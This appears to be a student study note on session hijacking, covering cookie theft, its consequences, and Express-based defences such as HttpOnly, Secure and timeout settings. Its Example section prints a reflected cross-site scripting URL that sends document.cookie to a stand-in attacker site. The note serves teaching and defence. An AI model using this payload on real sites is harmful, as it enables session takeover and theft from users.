- An attack where a user session is taken over by an attacker
- A session starts when you log into a service, for example your banking application, and ends when you log out
- Also known as cookie hijacking as attack relies on attacker's knowledge of you session cookie

## Execution
---
- In most cases when logging in to a web application, the server sets a temporary session cookie in your browser to remember that you are currently logged in and authenticated
- At attacker who manages to steal your session cookie can take over, I.e. Hijack your session by using the same session ID and fool the server into treating the attacker's connection as your original user's valid session

## Possibilities
---
If successful, the attacker can then perform any actions that the original user is authorized to do during the active session
- Transfer money from the user's bank account
- Pose as the user to buy items in web stores
- Access detailed personal information for identity theft
- Steal clients' personal data from company systems
- Encrypt valuable data and demand ransom to decrypt them

## Example
---
```
http://www.TrustedSearchEngine.com/search?<script>location.href='http://www.SecretVillianSite.com/hijacker.php?coookie='+document.cookie;</script>
```
- Victim clicks on link in email
- This would react the current session cookie using document.cookie and send it to the attacker's website by setting the location URL in the browser using location.href
- In this case, a successful attack relies on the application and web server accepting and executing un-validated input from the HTTP request

## Prevention
---
- Session Hijacking threats exists due to limitations of the stateless HTTP protocol
- No single guaranteed protection method but we can minimize the risk of attackers obtaining a valid session token

### HTTPS
- Use HTTPS to ensure SSL/TLS encryption of all session traffic
- HTTP (Hyper Text Transfer Protocol) packets are a standard of communicating information where information is sent in plaintext, such that an attacker listening to network traffic may "sniff" out information
- However, HTTPS (HTTP Secure) uses TLS (Transport Layer Security) or SSL (Secure Sockets Layer) to cryptographically secure text

### HTTP Only
- Set the HttpOnly attribute using the Set-Cookie HTTP header to prevent access to cookies from client-side scripts and specify the Secure and SameSite directives
```
app.use(session({ 
	cookieName: 'sessionName', 
	secret: "notagoodsecretnoreallydontusethisone", 
	resave: false, 
	saveUninitialized: true, 
	httpOnly: true, // dont let browser javascript access cookie ever 
	secure: true, // only use cookie over https 
	ephemeral: true // delete this cookie while browser close 
}));
```

### Web Frameworks
- Web frameworks offer highly secure and well-tested session ID generation and management mechanisms
- There are various different session modules for express
- Examples:
	- Express-session
	- Cookie-session

### User Identity Verification
- Perform additional user identity verification beyond the session key, Eg check user's usual IP address or application usage patterns or implement user inactivity timeout to close the user session after a set idle time
- Check user's usual IP address
```
var ip = req.header('x-forwarded-for') || req.connection.remoteAddress;
```
- Implement session timeout
```
const session = require('express-session'); 
app.use(session({ 
	secret: 'secret', 
	cookie: { 
		expires: 120000 
	} 
}));
```

#EnterpriseSystemsDevelopment 